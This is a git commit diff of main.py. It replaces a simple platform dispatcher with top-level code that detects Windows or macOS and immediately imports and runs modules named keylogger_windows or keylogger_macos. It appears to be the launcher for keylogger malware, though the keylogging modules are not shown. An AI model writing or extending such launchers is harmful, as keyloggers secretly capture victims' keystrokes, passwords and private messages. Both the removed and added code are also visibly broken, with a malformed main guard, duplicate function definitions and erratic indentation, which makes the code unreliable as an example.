44b8f7a98f583f24357e38ff46cb076467595eeb
TEJAL REDDY <darkstories2709@gmail.com>
2024-11-18 21:39:10 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,25 +1,13 @@
 import platform
 import sys
 
-def run_platform_script():
-    system_platform = platform.system().lower()
+system_platform = platform.system().lower()
 
-    if system_platform == 'windows':
-        import windows_script
-        windows_script.run()
-    elif system_platform == 'darwin':
-        import macos_script
-        macos_script.run()
-    else:
-        print(f"Unsupported platform: {system_platform}")
+if system_platform == 'windows':
+        import keylogger_windows
+        keylogger_windows.run()
+elif system_platform == 'darwin':
+        import keylogger_macos
+        keylogger_macos.run()
+else:
         sys.exit(1)
-
-if name== "main":
-    run_platform_script()
-def run():
-    print("Running Windows-specific logic.")
-def run():
-    print("Running macOS-specific logic.")
-def shared_function():
-    print("This function can be used across all platforms.")
-    
